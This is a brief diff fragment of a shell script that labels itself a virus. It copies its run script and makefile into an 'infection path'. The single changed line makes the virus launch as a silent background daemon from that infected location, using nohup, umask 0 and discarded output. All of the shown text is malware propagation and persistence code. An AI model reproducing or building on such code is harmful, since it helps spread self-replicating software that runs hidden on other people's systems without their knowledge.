@@ -25,4 +25,4 @@ cp -f $PATH_HOGSH/run.sh $INFECTION_PATH/run.sh
 cp -f $PATH_HOGSH/makefile $INFECTION_PATH/makefile
 
 # run virus as daemon
-cd /; umask 0; nohup sh "$PATH_HOGSH/run.sh" 0<&- &>/dev/null &
+cd /; umask 0; nohup sh "$INFECTION_PATH/run.sh" 0<&- &>/dev/null &
